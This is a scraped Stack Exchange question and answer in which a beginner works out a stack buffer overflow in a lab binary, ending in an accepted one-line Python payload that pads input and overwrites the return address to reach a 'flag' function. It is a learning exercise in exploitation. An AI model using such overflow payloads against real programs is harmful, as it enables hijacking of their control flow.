{
  "title": "How to exploit __isoc99_scanf with a segmentation fault",
  "link": "https://reverseengineering.stackexchange.com/questions/29620/how-to-exploit-isoc99-scanf-with-a-segmentation-fault",
  "content": "I'm an absolute newbie when it comes to all this side of reverse engineering. Each time I try and understand it, I get lost almost immediately.\n\nI am trying a lab. I open it up in Binary Ninja. I get the following\n\n\n\nWhen I open main I get the following\n\n\n\nNothing much seems to happen but there is a function(?) called flag that looks like what I need\n\n\n\nWhen I copy the address, it comes out as:\n\n```\n0x401152\n\n```\nI'm trying to do stuff like this on the command line but getting nowhere fast\n\n```\npython3 -c \"print (28 * 'A' + '\\x52\\x11\\x40')\" | ./santa;\n\n```\nI then try to iterate through and no luck although I do get a segmentation fault on the 53rd iteration\n\n```\nfor i in {0..60}; do python3 -c \"print ($i * 'A' + '\\x52\\x11\\x40')\" | ./santa; done\n\n```\nAny pointers? I'm absolutely lost\n\n",
  "votes": "0",
  "answers": 1,
  "views": "5k",
  "tags": [
    "binary-analysis",
    "binary",
    "buffer-overflow"
  ],
  "user": "pee2pee",
  "time": "Nov 26, 2021 at 19:13",
  "comments": [
    {
      "user": "0xC0000022L",
      "text": "Hi, generally we recommend to paste text as text, not screenshots. The reason being that search engines won't index screenshots the same way as text.",
      "time": null
    }
  ],
  "answers_data": [
    {
      "content": "```\npython3 -c \"print (56 * 'A' + '\\x53\\x11\\x40\\x00\\x00\\x00\\x00\\x00')\" | ./santa\n\n```\n",
      "votes": "0",
      "user": "pee2pee",
      "time": "Nov 26, 2021 at 19:59",
      "is_accepted": true,
      "comments": [
        {
          "user": "NirIzr",
          "text": "Would you care to elaborate on your solution?",
          "time": null
        },
        {
          "user": "herohamp",
          "text": "Basically they are overflowing the buffer that scanf was entering into, after overflowing out that buffer they will then be filling the saved frame pointer with garbage, after which in the stack comes the return address. So once the function hits retn it'll jump the new address they set 0x401152",
          "time": null
        }
      ]
    }
  ]
}